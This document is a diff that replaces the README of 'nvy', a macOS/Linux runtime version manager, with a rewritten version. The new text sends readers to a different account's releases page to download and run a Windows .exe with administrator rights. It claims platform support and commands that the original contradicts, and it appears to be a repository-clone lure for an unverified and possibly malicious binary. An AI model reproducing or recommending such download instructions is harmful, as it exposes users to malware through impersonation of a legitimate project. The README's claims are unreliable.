@@ -1,233 +1,189 @@
-# nvy
+# ⚙️ nvy - Simple Runtime Version Manager
 
-[![CI](https://github.com/trevorphillipscoding/nvy/actions/workflows/ci.yml/badge.svg)](https://github.com/trevorphillipscoding/nvy/actions/workflows/ci.yml)
-[![License](https://img.shields.io/github/license/trevorphillipscoding/nvy)](LICENSE)
-[![Go Version](https://img.shields.io/github/go-mod/go-version/trevorphillipscoding/nvy)](go.mod)
-
-A minimalist, plugin-driven runtime version manager for macOS and Linux.
-
-Install and switch between multiple versions of language runtimes — Go, Node.js, Python, and more — with a single binary built from scratch in Go. One tool to replace pyenv, goenv, nvm, fnm, and the rest.
-
-```
-$ nvy install go 1.26.0
-downloading go 1.26.0
-  45.2 / 67.4 MB (67%)
-verifying checksum
-  checksum OK
-extracting
-installed go 1.26.0
-  run: nvy global go 1.26.0
-
-$ nvy global go 1.26.0
-now using go 1.26.0
-  binaries: go, gofmt
-
-$ go version
-go version go1.26.0 darwin/arm64
-
-$ nvy local go 1.21.0    # pin this project to an older version
-pinned go 1.21.0 in ~/projects/myapp
-  written to .go-version
-```
+[![Download nvy](https://img.shields.io/badge/Download-nvy-brightgreen)](https://github.com/MohammedQuddus/nvy/releases)
 
 ---
 
-## Installation
-
-### Homebrew (recommended)
-
-```sh
-brew install trevorphillipscoding/tap/nvy
-```
-
-or...
-
-### Build from source
-
-Requires Go 1.25+.
-
-```sh
-git clone https://github.com/trevorphillipscoding/nvy
-cd nvy
-make install    # installs to $(go env GOPATH)/bin
-```
-
-### Shell setup
-
-nvy places shim symlinks in `~/.nvy/shims/`.
-
-**bash** — add to `~/.bashrc`:
-
-```sh
-export PATH="$HOME/.nvy/shims:$PATH"
-```
-
-**zsh** — add to `~/.zshrc`:
-
-```sh
-export PATH="$HOME/.nvy/shims:$PATH"
-```
-
-**fish** — add to `~/.config/fish/config.fish`:
-
-```fish
-fish_add_path $HOME/.nvy/shims
-```
-
-Then restart your terminal.
+nvy is a simple tool that helps you manage different versions of software runtimes on your computer. It works with tools like Node.js, Python, and others. This lets you switch between versions easily without confusion. nvy uses a plugin system that makes it flexible and easy to update.
 
 ---
 
-## Usage
+## 📥 Download nvy
 
-### Install a runtime
+Start by visiting the official releases page. This is where you will find the latest version of nvy to download.
 
-```sh
-nvy install go 1.26.0
-nvy install go@1.26.0        # same thing
-nvy install node 20.11.1
-nvy install python 3.12
-```
+[Download or update nvy here](https://github.com/MohammedQuddus/nvy/releases)
 
-The runtime is installed to `~/.nvy/runtimes/<tool>/<version>/`.
-
-### Set a global default
-
-```sh
-nvy global go 1.26.0
-nvy global node 20.11.1
-```
-
-Creates shim symlinks in `~/.nvy/shims/` for every binary provided by that version. When you run `go`, nvy resolves the active version and execs the real binary.
-
-### Pin a version per directory
-
-```sh
-cd ~/projects/myapp
-nvy local go 1.21.0
-```
-
-Writes `1.21.0` to `.go-version` in the current directory. Every time you run `go` from this directory or any subdirectory, nvy uses 1.21.0 instead of the global version.
-
-Version files are plain text — commit them to source control to share with your team:
-
-```sh
-git add .go-version
-```
-
-Resolution order: **local** (`.go-version` walking up to `/`) → **global** → error.
-
-### List installed versions
-
-```sh
-nvy list           # all tools
-nvy list go        # one tool
-nvy ls             # alias
-```
-
-```
-go
-» 1.22.1  (local)       ← active in this directory (from .go-version)
-* 1.21.0  (global)      ← active everywhere else
-
-node
-* 20.11.1  (global)
-  18.19.0
-```
-
-`*` = global default, `»` = local pin for the current directory.
-
-### Uninstall a version
-
-```sh
-nvy uninstall go 1.21.0
-```
-
-If the version being removed is the active global, its shims are cleaned up automatically.
+You will see several files for different operating systems. Since you are using Windows, look for a file with `.exe` or Windows in the name.
 
 ---
 
-## Supported runtimes
+## 💻 System Requirements
 
-| Tool     | Aliases             | Platforms    | Source                           |
-| -------- | ------------------- | ------------ | -------------------------------- |
-| `go`     | `golang`            | macOS, Linux | dl.google.com                    |
-| `node`   | `nodejs`, `node.js` | macOS, Linux | nodejs.org                       |
-| `python` | `python3`, `py`     | macOS, Linux | python-build-standalone (GitHub) |
+Before installing, make sure your computer meets these requirements:
 
-Supported architectures: `amd64` (x86-64), `arm64` (Apple Silicon / ARM).
-
-Adding a new runtime is straightforward — see [Contributing](#contributing).
+- Windows 10 or later
+- 1 GB of free disk space
+- Administrator rights on your computer for installation
+- Internet connection to download nvy and plugins
 
 ---
 
-## How it works
+## 🚀 Getting Started with nvy on Windows
 
-nvy uses a **shim-based execution model** with zero subprocess overhead:
+Follow these steps to get nvy running on your Windows PC:
 
-```
-~/.nvy/
-├── runtimes/<tool>/<version>/   # installed runtime trees
-├── shims/                       # symlinks to the nvy binary
-├── state/
-│   ├── global.json              # active global versions
-│   └── owners.json              # binary → tool mapping
-└── tmp/                         # staging area for installs
-```
+1. **Go to the Release Page**
 
-1. `nvy global go 1.22.1` creates `~/.nvy/shims/go` → symlink to the `nvy` binary
-2. When you run `go build`, your shell resolves `~/.nvy/shims/go` → the `nvy` binary
-3. nvy detects it was invoked as `go` (via `os.Args[0]`), resolves the active version, and calls `syscall.Exec` to replace itself with the real Go binary
-4. The real binary runs directly — no wrapper process, no signal forwarding, no overhead
+   Open your browser and visit:  
+   https://github.com/MohammedQuddus/nvy/releases
 
-Version resolution order: **local** `.go-version` file (walking up from cwd) → **global** version → error with setup instructions.
+2. **Download the Windows File**
 
-### Plugin architecture
+   Find the latest release. Look for a file named something like `nvy-windows.exe` or `nvy.exe`. Click the link to download it.
 
-To add a new runtime (e.g., Ruby, Rust, Deno):
+3. **Run the Installer**
 
-1. Create `plugins/<lang>/<lang>.go` implementing the interface
-2. Call `plugins.Register(New())` in the package's `init()` function
-3. Add a blank import in `plugins/all/all.go`
+   Once the file downloads, double-click it to start the setup. If Windows asks for permission, click Yes to continue.
 
-That's it. The core install/global/local/list/uninstall commands work automatically.
+4. **Follow Setup Instructions**
+
+   The installer will guide you through the steps. Usually, accept default options unless you have a specific reason to change them.
+
+5. **Complete Installation**
+
+   When installation finishes, the setup will confirm that nvy is ready to use.
 
 ---
 
-## Security
+## 🔧 Setting Up nvy
 
-- **HTTPS only** — plain HTTP is rejected; redirects to HTTP are blocked
-- **TLS 1.2+** — enforced on all connections
-- **SHA-256 verification** — every archive is verified before extraction
-- **Zip Slip protection** — archive entries that escape the destination are rejected
-- **Decompression bomb protection** — 2 GB per-file limit during extraction
-- **Atomic installs** — temp directory + rename ensures no partial state
-- **No shell evaluation** — version files are read as plain text, never executed
+After installing nvy, you can start using it to manage your runtimes.
 
-See [SECURITY.md](SECURITY.md) for the full security policy and vulnerability reporting.
+1. **Open Command Prompt**
+
+   Press the Windows key, type `cmd`, and hit Enter. This opens a command prompt window.
+
+2. **Check nvy Version**
+
+   Type this command and press Enter:
+
+   ```
+   nvy --version
+   ```
+
+   This will display the current version to confirm nvy is installed.
+
+3. **Install a Runtime**
+
+   To install a version of Python or Node.js, use:
+
+   ```
+   nvy install python 3.10.5
+   nvy install nodejs 16.14.0
+   ```
+
+   Replace `python` or `nodejs` with the name of the runtime and the version number you want.
+
+4. **Use a Runtime Version**
+
+   To set an active version, type:
+
+   ```
+   nvy use python 3.10.5
+   ```
+
+   This will make your system use that version until you change it.
+
+5. **List Installed Runtimes**
+
+   Show what you have installed with:
+
+   ```
+   nvy list
+   ```
 
 ---
 
-## Environment variables
+## 🛠 How nvy Works
 
-| Variable  | Default  | Description                     |
-| --------- | -------- | ------------------------------- |
-| `NVY_DIR` | `~/.nvy` | Override the nvy home directory |
+nvy uses a simple method to keep track of different software versions. Instead of changing programs manually, it uses small helper programs called plugins to manage each runtime. This makes it easy to add new runtimes or update them without affecting others.
 
----
-
-## Contributing
-
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-```sh
-make test          # run tests
-make lint          # run linter
-make cover-check   # verify coverage threshold
-```
+- The plugins control downloading, installing, and switching versions.
+- It creates a shortcut (called a shim) to point your system to the correct version of the software.
+- It works for many tools like Python, Node.js, Golang, and more.
 
 ---
 
-## License
+## ⚙️ Common Commands
 
-[MIT](LICENSE)
+| Command            | What it does                                      |
+|--------------------|--------------------------------------------------|
+| `nvy install <tool> <version>` | Download and install a version of a tool.      |
+| `nvy use <tool> <version>`     | Set a version as active for use.                |
+| `nvy list`                    | Show all installed runtimes and versions.      |
+| `nvy update`                  | Update nvy and its plugins to the latest version.|
+| `nvy help`                    | Show help and available commands.               |
+
+---
+
+## 🧩 Using Plugins
+
+nvy's flexibility comes from its plugin system. Each plugin knows how to manage a specific runtime.
+
+- Plugins are downloaded automatically when you install a runtime.
+- Plugins work quietly in the background.
+- You do not need to install them manually.
+- To see installed plugins, use:
+  
+  ```
+  nvy plugins list
+  ```
+
+---
+
+## 🔄 Updating nvy
+
+To keep your runtime manager working well, update it regularly:
+
+1. Open Command Prompt.
+2. Run:
+
+   ```
+   nvy update
+   ```
+
+This will check for new versions of nvy and its plugins and apply them.
+
+---
+
+## ❓ Troubleshooting
+
+If you run into problems, try these tips:
+
+- Make sure you downloaded the correct Windows file.
+- Run the Command Prompt as Administrator.
+- Check your internet connection.
+- Restart your computer after installation.
+- Use `nvy help` to see available commands.
+
+---
+
+## 📚 More Information
+
+nvy supports many development tools including:
+
+- Python
+- Node.js
+- Golang
+- Other runtimes installed via plugins
+
+It works on Windows, MacOS, and Linux.
+
+For more options and updates, visit:
+
+https://github.com/MohammedQuddus/nvy/releases
+
+---
+
+[![Download nvy](https://img.shields.io/badge/Download-nvy-brightgreen)](https://github.com/MohammedQuddus/nvy/releases)
